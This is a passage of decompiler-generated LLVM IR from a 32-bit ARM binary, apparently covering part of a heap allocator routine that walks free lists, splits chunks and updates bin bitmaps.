  %v1_14f64 = add i32 %v4_14f5c, 52
  store i32 %v1_14f64, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14f1c, %dec_label_pc_14f54
  %v0_14e88 = phi i32 [ %v0_14f68.pre, %dec_label_pc_14f1c ], [ %v1_14f64, %dec_label_pc_14f54 ]
  %v1_14f68 = add i32 %v0_14e88, 12
  %v2_14f68 = inttoptr i32 %v1_14f68 to i32*
  %v3_14f68 = load i32, i32* %v2_14f68, align 4
  store i32 %v3_14f68, i32* @r6, align 4
  %v9_14f6c = icmp eq i32 %v3_14f68, %v0_14e88
  br i1 %v9_14f6c, label %dec_label_pc_14f74, label %dec_label_pc_14e1c

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f68
  %v0_14f74 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_14f74, 256
  %v0_1502c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_14f74.dec_label_pc_1502c_crit_edge, label %dec_label_pc_14f7c

dec_label_pc_14f74.dec_label_pc_1502c_crit_edge:  ; preds = %dec_label_pc_14f74
  %.pre200 = mul i32 %v0_1502c.pre, 8
  br label %dec_label_pc_1502c

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f74
  %v4_14f7c = mul i32 %v0_1502c.pre, 8
  %v5_14f7c = add i32 %v4_14f7c, %v0_14e88
  store i32 %v5_14f7c, i32* %r3.global-to-local, align 4
  %v1_14f80 = add i32 %v5_14f7c, -8
  store i32 %v1_14f80, i32* %r1.global-to-local, align 4
  %v1_14f84 = add i32 %v5_14f7c, 4
  %v2_14f84 = inttoptr i32 %v1_14f84 to i32*
  %storemerge.pre = load i32, i32* %v2_14f84, align 4
  br label %dec_label_pc_15024

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_15024
  %v1_14f8c = add i32 %v1_14fb4, 4
  %v2_14f8c = inttoptr i32 %v1_14f8c to i32*
  %v3_14f8c = load i32, i32* %v2_14f8c, align 4
  store i32 %v3_14f8c, i32* %r3.global-to-local, align 4
  %v1_14f90 = and i32 %v3_14f8c, -4
  store i32 %v1_14f90, i32* %r2.global-to-local, align 4
  %v3_14f94 = icmp ult i32 %v1_14f90, %v0_14f74
  %v1_14f98 = add i32 %v1_14fb4, 12
  %v2_14f98 = inttoptr i32 %v1_14f98 to i32*
  %v3_14f98 = load i32, i32* %v2_14f98, align 4
  store i32 %v3_14f98, i32* %r0.global-to-local, align 4
  br i1 %v3_14f94, label %dec_label_pc_15024, label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f8c
  %v1_14fa0 = add i32 %v1_14fb4, 8
  %v2_14fa0 = inttoptr i32 %v1_14fa0 to i32*
  %v3_14fa0 = load i32, i32* %v2_14fa0, align 4
  store i32 %v3_14fa0, i32* %r1.global-to-local, align 4
  %v1_14fa4 = add i32 %v3_14fa0, 12
  %v2_14fa4 = inttoptr i32 %v1_14fa4 to i32*
  %v3_14fa4 = load i32, i32* %v2_14fa4, align 4
  store i32 %v3_14fa4, i32* %r3.global-to-local, align 4
  %v9_14fa8 = icmp eq i32 %v3_14fa4, %v1_14fb4
  br i1 %v9_14fa8, label %dec_label_pc_14fb0, label %dec_label_pc_14fbc

dec_label_pc_14fb0:                               ; preds = %dec_label_pc_14fa0
  %v1_14fb0 = add i32 %v3_14f98, 8
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  store i32 %v3_14fb0, i32* %r3.global-to-local, align 4
  %v9_14fb4 = icmp eq i32 %v3_14fb0, %v1_14fb4
  br i1 %v9_14fb4, label %dec_label_pc_14fc0, label %dec_label_pc_14fbc

dec_label_pc_14fbc:                               ; preds = %dec_label_pc_14fa0, %dec_label_pc_14fb0
  %v0_14fbc = call i32 @function_15acc()
  store i32 %v0_14fbc, i32* %r0.global-to-local, align 4
  %v0_14fc0.pre = load i32, i32* @sl, align 4
  %v1_14fc0.pre = load i32, i32* @r2, align 4
  %v0_14fc8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14fb0, %dec_label_pc_14fbc
  %v1_14fc8 = phi i32 [ %v3_14f98, %dec_label_pc_14fb0 ], [ %v0_14fbc, %dec_label_pc_14fbc ]
  %v0_14fc8 = phi i32 [ %v3_14fa0, %dec_label_pc_14fb0 ], [ %v0_14fc8.pre, %dec_label_pc_14fbc ]
  %v1_14fc0 = phi i32 [ %v1_14f90, %dec_label_pc_14fb0 ], [ %v1_14fc0.pre, %dec_label_pc_14fbc ]
  %v0_14fc0 = phi i32 [ %v0_14f74, %dec_label_pc_14fb0 ], [ %v0_14fc0.pre, %dec_label_pc_14fbc ]
  %v2_14fc0 = sub i32 %v1_14fc0, %v0_14fc0
  store i32 %v2_14fc0, i32* %lr.global-to-local, align 4
  %v2_14fc8 = add i32 %v1_14fc8, 8
  %v3_14fc8 = inttoptr i32 %v2_14fc8 to i32*
  store i32 %v0_14fc8, i32* %v3_14fc8, align 4
  %v0_14fcc = load i32, i32* %r0.global-to-local, align 4
  %v1_14fcc = load i32, i32* %r1.global-to-local, align 4
  %v2_14fcc = add i32 %v1_14fcc, 12
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v0_14fcc, i32* %v3_14fcc, align 4
  %v0_14fd0 = load i32, i32* %ip.global-to-local, align 4
  %v1_14fd0 = add i32 %v0_14fd0, 8
  store i32 %v1_14fd0, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_14fc0, 15
  br i1 %tmp207, label %dec_label_pc_14ff0, label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fc0
  %v1_14fd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fd8 = add i32 %v1_14fd8, %v0_14fd0
  store i32 %v2_14fd8, i32* %r2.global-to-local, align 4
  %v1_14fdc = add i32 %v2_14fd8, 4
  %v2_14fdc = inttoptr i32 %v1_14fdc to i32*
  %v3_14fdc = load i32, i32* %v2_14fdc, align 4
  store i32 %v3_14fdc, i32* %r3.global-to-local, align 4
  store i32 %v1_14fd0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_14fe4.loopexit:                      ; preds = %dec_label_pc_14e84
  %v1_14e90 = load i32, i32* @r6, align 4
  %v2_14e90 = load i32, i32* @sl, align 4
  %v3_14e90 = add i32 %v2_14e90, %v1_14e90
  store i32 %v3_14e90, i32* %r2.global-to-local, align 4
  %v2_14e94 = add i32 %v3_14e90, 4
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  %v4_14e94 = load i32, i32* %v3_14e94, align 4
  store i32 %v4_14e94, i32* %r3.global-to-local, align 4
  %v2_14e98 = add i32 %v1_14e90, 8
  store i32 %v2_14e98, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_14fe4:                               ; preds = %.dec_label_pc_14fe4_crit_edge, %dec_label_pc_14fe4.loopexit, %dec_label_pc_14fd8
  %v1_14fe8 = phi i32 [ %v4_1510c, %.dec_label_pc_14fe4_crit_edge ], [ %v3_14e90, %dec_label_pc_14fe4.loopexit ], [ %v2_14fd8, %dec_label_pc_14fd8 ]
  %v0_14fe4 = phi i32 [ %v7_1510c, %.dec_label_pc_14fe4_crit_edge ], [ %v4_14e94, %dec_label_pc_14fe4.loopexit ], [ %v3_14fdc, %dec_label_pc_14fd8 ]
  %v1_14fe4 = or i32 %v0_14fe4, 1
  store i32 %v1_14fe4, i32* %r3.global-to-local, align 4
  %v2_14fe8 = add i32 %v1_14fe8, 4
  %v3_14fe8 = inttoptr i32 %v2_14fe8 to i32*
  store i32 %v1_14fe4, i32* %v3_14fe8, align 4
  br label %dec_label_pc_155a4

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fc0
  %v1_14ff0 = load i32, i32* @sl, align 4
  %v2_14ff0 = add i32 %v1_14ff0, %v0_14fd0
  store i32 %v2_14ff0, i32* %r2.global-to-local, align 4
  %v1_14ff4 = or i32 %v1_14ff0, 1
  store i32 %v1_14ff4, i32* %r3.global-to-local, align 4
  %v0_14ff8 = load i32, i32* %lr.global-to-local, align 4
  %v1_14ff8 = or i32 %v0_14ff8, 1
  store i32 %v1_14ff8, i32* %r1.global-to-local, align 4
  store i32 %v1_14fd0, i32* %r4.global-to-local, align 4
  %v2_15000 = add i32 %v0_14fd0, 4
  %v3_15000 = inttoptr i32 %v2_15000 to i32*
  store i32 %v1_14ff4, i32* %v3_15000, align 4
  %v0_15004 = load i32, i32* %r2.global-to-local, align 4
  %v1_15004 = load i32, i32* @r6, align 4
  %v2_15004 = add i32 %v1_15004, 8
  %v3_15004 = inttoptr i32 %v2_15004 to i32*
  store i32 %v0_15004, i32* %v3_15004, align 4
  %v0_15008 = load i32, i32* %r2.global-to-local, align 4
  %v1_15008 = load i32, i32* @r6, align 4
  %v2_15008 = add i32 %v1_15008, 12
  %v3_15008 = inttoptr i32 %v2_15008 to i32*
  store i32 %v0_15008, i32* %v3_15008, align 4
  %v0_1500c = load i32, i32* %lr.global-to-local, align 4
  %v1_1500c = load i32, i32* %r2.global-to-local, align 4
  %v3_1500c = add i32 %v1_1500c, %v0_1500c
  %v4_1500c = inttoptr i32 %v3_1500c to i32*
  store i32 %v0_1500c, i32* %v4_1500c, align 4
  %v0_15010 = load i32, i32* %r1.global-to-local, align 4
  %v1_15010 = load i32, i32* %r2.global-to-local, align 4
  %v2_15010 = add i32 %v1_15010, 4
  %v3_15010 = inttoptr i32 %v2_15010 to i32*
  store i32 %v0_15010, i32* %v3_15010, align 4
  %v0_15014 = load i32, i32* @r6, align 4
  %v1_15014 = load i32, i32* %r2.global-to-local, align 4
  %v2_15014 = add i32 %v1_15014, 12
  %v3_15014 = inttoptr i32 %v2_15014 to i32*
  store i32 %v0_15014, i32* %v3_15014, align 4
  %v0_15018 = load i32, i32* @r6, align 4
  %v1_15018 = load i32, i32* %r2.global-to-local, align 4
  %v2_15018 = add i32 %v1_15018, 8
  %v3_15018 = inttoptr i32 %v2_15018 to i32*
  store i32 %v0_15018, i32* %v3_15018, align 4
  br label %dec_label_pc_155a4

dec_label_pc_15024:                               ; preds = %dec_label_pc_14f8c, %dec_label_pc_14f7c
  %v1_14fb4 = phi i32 [ %storemerge.pre, %dec_label_pc_14f7c ], [ %v3_14f98, %dec_label_pc_14f8c ]
  store i32 %v1_14fb4, i32* %ip.global-to-local, align 4
  %v9_15024 = icmp eq i32 %v1_14fb4, %v1_14f80
  br i1 %v9_15024, label %dec_label_pc_1502c.loopexit, label %dec_label_pc_14f8c

dec_label_pc_1502c.loopexit:                      ; preds = %dec_label_pc_15024
  br label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_14f74.dec_label_pc_1502c_crit_edge, %dec_label_pc_1502c.loopexit
  %v4_1505c.pre-phi = phi i32 [ %.pre200, %dec_label_pc_14f74.dec_label_pc_1502c_crit_edge ], [ %v4_14f7c, %dec_label_pc_1502c.loopexit ]
  %v1_1502c = add i32 %v0_1502c.pre, 1
  store i32 %v1_1502c, i32* %r2.global-to-local, align 4
  %v1_15030 = urem i32 %v1_1502c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 180260, i32* %r0.global-to-local, align 4
  %v6_1503c = shl i32 1, %v1_15030
  store i32 %v6_1503c, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15044 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15044, i32* %r3.global-to-local, align 4
  %v3_15048 = udiv i32 %v1_1502c, 32
  store i32 %v3_15048, i32* @r5, align 4
  %v4_1504c = mul nuw nsw i32 %v3_15048, 4
  %v5_1504c = add i32 %v4_15044, %v4_1504c
  store i32 %v5_1504c, i32* %r2.global-to-local, align 4
  %v1_15050 = add i32 %v5_1504c, 820
  %v2_15050 = inttoptr i32 %v1_15050 to i32*
  %v3_15050 = load i32, i32* %v2_15050, align 4
  store i32 %v3_15050, i32* @r4, align 4
  %v1_15054 = add i32 %v4_15044, 52
  store i32 %v1_15054, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_1505c = add i32 %v1_15054, %v4_1505c.pre-phi
  store i32 %v5_1505c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15060

dec_label_pc_15060:                               ; preds = %dec_label_pc_150c8, %dec_label_pc_1502c
  %v1_15068 = phi i32 [ %v1_15068.pre, %dec_label_pc_150c8 ], [ %v3_15050, %dec_label_pc_1502c ]
  %v0_15068 = phi i32 [ %v0_15060.pre, %dec_label_pc_150c8 ], [ %v6_1503c, %dec_label_pc_1502c ]
  %v1_15060 = sub i32 1, %v0_15068
  %v2_15060 = icmp ult i32 %v0_15068, 2
  %v1_15060. = select i1 %v2_15060, i32 %v1_15060, i32 0
  store i32 %v1_15060., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_15068, %v1_15068
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_15060
  %v5_1506c = or i32 %v1_15060., 1
  store i32 %v5_1506c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15078.preheader

bb142:                                            ; preds = %dec_label_pc_15060
  %v2_15070 = icmp eq i32 %v1_15060., 0
  br i1 %v2_15070, label %.dec_label_pc_150b4.preheader_crit_edge, label %dec_label_pc_15078.preheader

.dec_label_pc_150b4.preheader_crit_edge:          ; preds = %bb142
  %v0_150ac54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150b4.preheader

dec_label_pc_15078.preheader:                     ; preds = %bb142, %.thread12
  %v0_15078.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15078

dec_label_pc_15078:                               ; preds = %dec_label_pc_15078.preheader, %dec_label_pc_15084
  %v0_15078 = phi i32 [ %v0_15078.pre, %dec_label_pc_15078.preheader ], [ %v1_15078, %dec_label_pc_15084 ]
  %v1_15078 = add i32 %v0_15078, 1
  store i32 %v1_15078, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_15078, 2
  br i1 %tmp208, label %dec_label_pc_15158.loopexit, label %dec_label_pc_15084

dec_label_pc_15084:                               ; preds = %dec_label_pc_15078
  store i32 180260, i32* %r3.global-to-local, align 4
  %v1_15088 = load i32, i32* @r8, align 4
  %v2_15088 = add i32 %v1_15088, 180260
  %v3_15088 = inttoptr i32 %v2_15088 to i32*
  %v4_15088 = load i32, i32* %v3_15088, align 4
  store i32 %v4_15088, i32* %r2.global-to-local, align 4
  %v4_1508c = mul i32 %v1_15078, 4
  %v5_1508c = add i32 %v4_15088, %v4_1508c
  store i32 %v5_1508c, i32* %r3.global-to-local, align 4
  %v1_15090 = add i32 %v5_1508c, 820
  %v2_15090 = inttoptr i32 %v1_15090 to i32*
  %v3_15090 = load i32, i32* %v2_15090, align 4
  store i32 %v3_15090, i32* @r4, align 4
  %v2_15094 = icmp eq i32 %v3_15090, 0
  br i1 %v2_15094, label %dec_label_pc_15078, label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15084
  %v4_1509c = mul i32 %v1_15078, 256
  %v5_1509c = add i32 %v4_15088, %v4_1509c
  store i32 %v5_1509c, i32* %r3.global-to-local, align 4
  %v1_150a0 = add i32 %v5_1509c, 44
  store i32 %v1_150a0, i32* %r0.global-to-local, align 4
  %v0_150a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_150a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_150b4.preheader

dec_label_pc_150b4.preheader:                     ; preds = %.dec_label_pc_150b4.preheader_crit_edge, %dec_label_pc_1509c
  %v0_150ac54 = phi i32 [ %v1_150a0, %dec_label_pc_1509c ], [ %v0_150ac54.pre, %.dec_label_pc_150b4.preheader_crit_edge ]
  %v0_150d0 = phi i32 [ %v3_15090, %dec_label_pc_1509c ], [ %v1_15068, %.dec_label_pc_150b4.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_150a4, %dec_label_pc_1509c ], [ %v0_15068, %.dec_label_pc_150b4.preheader_crit_edge ]
  %v2_150b451 = and i32 %ip.promoted, %v0_150d0
  %v4_150b453 = icmp eq i32 %v2_150b451, 0
  br i1 %v4_150b453, label %dec_label_pc_150ac, label %dec_label_pc_150bc

dec_label_pc_150ac:                               ; preds = %dec_label_pc_150b4.preheader, %dec_label_pc_150ac
  %v2_150b056 = phi i32 [ %v2_150b0, %dec_label_pc_150ac ], [ %ip.promoted, %dec_label_pc_150b4.preheader ]
  %v0_150ac55 = phi i32 [ %v1_150ac, %dec_label_pc_150ac ], [ %v0_150ac54, %dec_label_pc_150b4.preheader ]
  %v1_150ac = add i32 %v0_150ac55, 8
  %v2_150b0 = mul i32 %v2_150b056, 2
  %v2_150b4 = and i32 %v2_150b0, %v0_150d0
  %v4_150b4 = icmp eq i32 %v2_150b4, 0
  br i1 %v4_150b4, label %dec_label_pc_150ac, label %dec_label_pc_150b4.dec_label_pc_150bc_crit_edge

dec_label_pc_150b4.dec_label_pc_150bc_crit_edge:  ; preds = %dec_label_pc_150ac
  store i32 %v1_150ac, i32* %r0.global-to-local, align 4
  store i32 %v2_150b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150b4.dec_label_pc_150bc_crit_edge, %dec_label_pc_150b4.preheader
  %v0_150dc = phi i32 [ %v2_150b0, %dec_label_pc_150b4.dec_label_pc_150bc_crit_edge ], [ %ip.promoted, %dec_label_pc_150b4.preheader ]
  %v0_15100 = phi i32 [ %v1_150ac, %dec_label_pc_150b4.dec_label_pc_150bc_crit_edge ], [ %v0_150ac54, %dec_label_pc_150b4.preheader ]
  %v1_150bc = add i32 %v0_15100, 12
  %v2_150bc = inttoptr i32 %v1_150bc to i32*
  %v3_150bc = load i32, i32* %v2_150bc, align 4
  store i32 %v3_150bc, i32* @lr, align 4
  %v9_150c0 = icmp eq i32 %v3_150bc, %v0_15100
  br i1 %v9_150c0, label %dec_label_pc_150c8, label %dec_label_pc_150e8

dec_label_pc_150c8:                               ; preds = %dec_label_pc_150bc
  store i32 180260, i32* %r0.global-to-local, align 4
  %v1_150cc = load i32, i32* @r8, align 4
  %v2_150cc = add i32 %v1_150cc, 180260
  %v3_150cc = inttoptr i32 %v2_150cc to i32*
  %v4_150cc = load i32, i32* %v3_150cc, align 4
  %v2_150d0 = sub i32 -1, %v0_150dc
  %v3_150d0 = and i32 %v0_150d0, %v2_150d0
  store i32 %v3_150d0, i32* @r4, align 4
  %v1_150d4 = load i32, i32* @r5, align 4
  %v4_150d4 = mul i32 %v1_150d4, 4
  %v5_150d4 = add i32 %v4_150d4, %v4_150cc
  store i32 %v5_150d4, i32* %r3.global-to-local, align 4
  %v1_150d8 = add i32 %v0_15100, 8
  store i32 %v1_150d8, i32* %r0.global-to-local, align 4
  %v2_150dc = mul i32 %v0_150dc, 2
  store i32 %v2_150dc, i32* %ip.global-to-local, align 4
  %v2_150e0 = add i32 %v5_150d4, 820
  %v3_150e0 = inttoptr i32 %v2_150e0 to i32*
  store i32 %v3_150d0, i32* %v3_150e0, align 4
  %v0_15060.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_15068.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15060

dec_label_pc_150e8:                               ; preds = %dec_label_pc_150bc
  %v1_150e8 = add i32 %v3_150bc, 4
  %v2_150e8 = inttoptr i32 %v1_150e8 to i32*
  %v3_150e8 = load i32, i32* %v2_150e8, align 4
  store i32 %v3_150e8, i32* %r3.global-to-local, align 4
  %v1_150ec = and i32 %v3_150e8, -4
  store i32 %v1_150ec, i32* %r2.global-to-local, align 4
  %v0_150f0 = load i32, i32* @sl, align 4
  %v2_150f0 = sub i32 %v1_150ec, %v0_150f0
  store i32 %v2_150f0, i32* %ip.global-to-local, align 4
  %v1_150f4 = add i32 %v3_150bc, 12
  %v2_150f4 = inttoptr i32 %v1_150f4 to i32*
  %v3_150f4 = load i32, i32* %v2_150f4, align 4
  store i32 %v3_150f4, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_150f0, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_150e8
  %v6_150fc = add i32 %v1_150ec, %v3_150bc
  store i32 %v6_150fc, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_150e8, %bb143
  %v2_15100 = add i32 %v3_150f4, 8
  %v3_15100 = inttoptr i32 %v2_15100 to i32*
  store i32 %v0_15100, i32* %v3_15100, align 4
  %v0_15104 = load i32, i32* %r3.global-to-local, align 4
  %v1_15104 = load i32, i32* %r0.global-to-local, align 4
  %v2_15104 = add i32 %v1_15104, 12
  %v3_15104 = inttoptr i32 %v2_15104 to i32*
  store i32 %v0_15104, i32* %v3_15104, align 4
  %v4_15108 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_14fe4_crit_edge, label %dec_label_pc_15114

.dec_label_pc_14fe4_crit_edge:                    ; preds = %bb144
  %v5_15108 = add i32 %v4_15108, 8
  store i32 %v5_15108, i32* %r4.global-to-local, align 4
  %v4_1510c = load i32, i32* %r2.global-to-local, align 4
  %v5_1510c = add i32 %v4_1510c, 4
  %v6_1510c = inttoptr i32 %v5_1510c to i32*
  %v7_1510c = load i32, i32* %v6_1510c, align 4
  store i32 %v7_1510c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_15114:                               ; preds = %bb144
  %v1_15114 = load i32, i32* @sl, align 4
  %v2_15114 = add i32 %v1_15114, %v4_15108
  store i32 %v2_15114, i32* %r1.global-to-local, align 4
  %v1_1511c = load i32, i32* @r6, align 4
  %v2_1511c = add i32 %v1_1511c, 8
  %v3_1511c = inttoptr i32 %v2_1511c to i32*
  store i32 %v2_15114, i32* %v3_1511c, align 4
  %v0_15120 = load i32, i32* %r1.global-to-local, align 4
  %v1_15120 = load i32, i32* @r6, align 4
  %v2_15120 = add i32 %v1_15120, 12
  %v3_15120 = inttoptr i32 %v2_15120 to i32*
  store i32 %v0_15120, i32* %v3_15120, align 4
  %v0_15124 = load i32, i32* @r6, align 4
  %v1_15124 = load i32, i32* %r1.global-to-local, align 4
  %v2_15124 = add i32 %v1_15124, 8
  %v3_15124 = inttoptr i32 %v2_15124 to i32*
  store i32 %v0_15124, i32* %v3_15124, align 4
  %v0_15128 = load i32, i32* @r6, align 4
  %v1_15128 = load i32, i32* %r1.global-to-local, align 4
  %v2_15128 = add i32 %v1_15128, 12
  %v3_15128 = inttoptr i32 %v2_15128 to i32*
  store i32 %v0_15128, i32* %v3_15128, align 4
  %tmp210 = icmp ult i32 %v1_15114, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_15114
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %r2.global-to-local, align 4
  %v8_15134 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v8_15134, i32* %r3.global-to-local, align 4
  %v4_15138 = load i32, i32* %r1.global-to-local, align 4
  %v6_15138 = add i32 %v8_15134, 48
  %v7_15138 = inttoptr i32 %v6_15138 to i32*
  store i32 %v4_15138, i32* %v7_15138, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_15114, %bb145
  %v0_1513c = load i32, i32* @sl, align 4
  %v1_1513c = or i32 %v0_1513c, 1
  store i32 %v1_1513c, i32* %r2.global-to-local, align 4
  %v0_15140 = load i32, i32* %ip.global-to-local, align 4
  %v1_15140 = or i32 %v0_15140, 1
  store i32 %v1_15140, i32* %r3.global-to-local, align 4
  %v0_15144 = load i32, i32* @lr, align 4
  %v1_15144 = add i32 %v0_15144, 8
  store i32 %v1_15144, i32* %r4.global-to-local, align 4
  %v2_15148 = add i32 %v0_15144, 4
  %v3_15148 = inttoptr i32 %v2_15148 to i32*
  store i32 %v1_1513c, i32* %v3_15148, align 4
  %v0_1514c = load i32, i32* %ip.global-to-local, align 4
  %v1_1514c = load i32, i32* %r1.global-to-local, align 4
  %v3_1514c = add i32 %v1_1514c, %v0_1514c
  %v4_1514c = inttoptr i32 %v3_1514c to i32*
  store i32 %v0_1514c, i32* %v4_1514c, align 4
  %v0_15150 = load i32, i32* %r3.global-to-local, align 4
  %v1_15150 = load i32, i32* %r1.global-to-local, align 4
  %v2_15150 = add i32 %v1_15150, 4
  %v3_15150 = inttoptr i32 %v2_15150 to i32*
  store i32 %v0_15150, i32* %v3_15150, align 4
  br label %dec_label_pc_155a4

dec_label_pc_15158.loopexit:                      ; preds = %dec_label_pc_15078
  br label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %dec_label_pc_15158.loopexit, %dec_label_pc_14d6c, %dec_label_pc_14d74
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %ip.global-to-local, align 4
  %v4_15160 = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15160, i32* @r0, align 4
  %v1_15164 = add i32 %v4_15160, 44
  %v2_15164 = inttoptr i32 %v1_15164 to i32*
  %v3_15164 = load i32, i32* %v2_15164, align 4
  store i32 %v3_15164, i32* %ip.global-to-local, align 4
  %v1_15168 = add i32 %v3_15164, 4
  %v2_15168 = inttoptr i32 %v1_15168 to i32*
  %v3_15168 = load i32, i32* %v2_15168, align 4
  %v0_1516c = load i32, i32* @sl, align 4
  %v1_1516c = add i32 %v0_1516c, 16
  store i32 %v1_1516c, i32* %r1.global-to-local, align 4
  %v1_15170 = and i32 %v3_15168, -4
  store i32 %v1_15170, i32* %r3.global-to-local, align 4
  %v3_15174 = icmp ult i32 %v1_15170, %v1_1516c
  br i1 %v3_15174, label %dec_label_pc_151a4, label %dec_label_pc_15180

dec_label_pc_15180:                               ; preds = %dec_label_pc_15158
  %v2_15180 = sub i32 %v1_15170, %v0_1516c
  %v2_15184 = add i32 %v0_1516c, %v3_15164
  store i32 %v2_15184, i32* %r1.global-to-local, align 4
  %v1_15188 = or i32 %v2_15180, 1
  store i32 %v1_15188, i32* %r3.global-to-local, align 4
  %v1_1518c = or i32 %v0_1516c, 1
  store i32 %v1_1518c, i32* %r2.global-to-local, align 4
  %v1_15190 = add i32 %v3_15164, 8
  store i32 %v1_15190, i32* %r4.global-to-local, align 4
  store i32 %v1_1518c, i32* %v2_15168, align 4
  %v0_15198 = load i32, i32* %r1.global-to-local, align 4
  %v1_15198 = load i32, i32* @r0, align 4
  %v2_15198 = add i32 %v1_15198, 44
  %v3_15198 = inttoptr i32 %v2_15198 to i32*
  store i32 %v0_15198, i32* %v3_15198, align 4
  %v0_1519c = load i32, i32* %r3.global-to-local, align 4
  %v1_1519c = load i32, i32* %r1.global-to-local, align 4
  %v2_1519c = add i32 %v1_1519c, 4
  %v3_1519c = inttoptr i32 %v2_1519c to i32*
  store i32 %v0_1519c, i32* %v3_1519c, align 4
  br label %dec_label_pc_155a4

dec_label_pc_151a4:                               ; preds = %dec_label_pc_15158
  %v1_151a4 = inttoptr i32 %v4_15160 to i32*
  %v2_151a4 = load i32, i32* %v1_151a4, align 4
  store i32 %v2_151a4, i32* %r3.global-to-local, align 4
  %v1_151a8 = and i32 %v2_151a4, 2
  store i32 %v1_151a8, i32* %ip.global-to-local, align 4
  %v2_151a8 = icmp eq i32 %v1_151a8, 0
  %v1_151ac = add i32 %v4_15160, 860
  %v2_151ac = inttoptr i32 %v1_151ac to i32*
  %v3_151ac = load i32, i32* %v2_151ac, align 4
  store i32 %v3_151ac, i32* %r1.global-to-local, align 4
  br i1 %v2_151a8, label %dec_label_pc_151c4, label %dec_label_pc_151b4

dec_label_pc_151b4:                               ; preds = %dec_label_pc_151a4
  %v0_151b4 = call i32 @function_1569c()
  %v0_151b8 = load i32, i32* @sl, align 4
  %v1_151b8 = add i32 %v0_151b8, -7
  store i32 %v1_151b8, i32* %r0.global-to-local, align 4
  %v1_151bc = call i32 @function_14ccc(i32 %v1_151b8)
  store i32 %v1_151bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155a0

dec_label_pc_151c4:                               ; preds = %dec_label_pc_151a4
  %v1_151c4 = add i32 %v4_15160, 844
  %v2_151c4 = inttoptr i32 %v1_151c4 to i32*
  %v3_151c4 = load i32, i32* %v2_151c4, align 4
  store i32 %v3_151c4, i32* %r3.global-to-local, align 4
  %v3_151c8 = icmp ult i32 %v0_1516c, %v3_151c4
  %v1_151cc = add i32 %v3_151ac, -1
  store i32 %v1_151cc, i32* %sb.global-to-local, align 4
  br i1 %v3_151c8, label %dec_label_pc_152a0, label %dec_label_pc_151d4

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151c4
  %v1_151d4 = add i32 %v4_15160, 852
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  %v3_151d4 = load i32, i32* %v2_151d4, align 4
  store i32 %v3_151d4, i32* %r2.global-to-local, align 4
  %v1_151d8 = add i32 %v4_15160, 848
  %v2_151d8 = inttoptr i32 %v1_151d8 to i32*
  %v3_151d8 = load i32, i32* %v2_151d8, align 4
  store i32 %v3_151d8, i32* %r3.global-to-local, align 4
  %v6_151e0 = icmp slt i32 %v3_151d8, %v3_151d4
  br i1 %v6_151e0, label %dec_label_pc_151e4, label %dec_label_pc_152a0

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151d4
  %v1_151e4 = add i32 %v0_1516c, 10
  %v2_151e8 = add i32 %v1_151e4, %v3_151ac
  store i32 %v2_151e8, i32* %r3.global-to-local, align 4
